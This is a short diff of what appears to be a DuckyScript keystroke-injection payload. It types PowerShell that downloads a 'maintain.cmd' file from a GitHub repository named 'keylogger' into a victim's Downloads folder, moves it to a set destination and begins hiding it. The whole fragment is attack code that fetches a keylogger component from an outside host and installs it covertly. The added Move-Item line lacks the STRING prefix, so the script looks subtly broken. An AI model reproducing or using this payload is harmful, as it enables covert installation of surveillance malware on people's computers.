@@ -61,9 +61,10 @@ DELAY 200
 STRING }
 ENTER
 DELAY 200
-STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/maintain.cmd" -OutFile $filedest
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/maintain.cmd" -OutFile 'C:\Users\' + $username + '\Downloads\maintain.cmd'
 ENTER
 DELAY 200
+Move-Item -Path 'C:\Users\' + $username + '\Downloads\maintain.cmd' -Destination $filedest
 STRING $HIDE=Get-Item $dest -Force
 ENTER
 DELAY 200
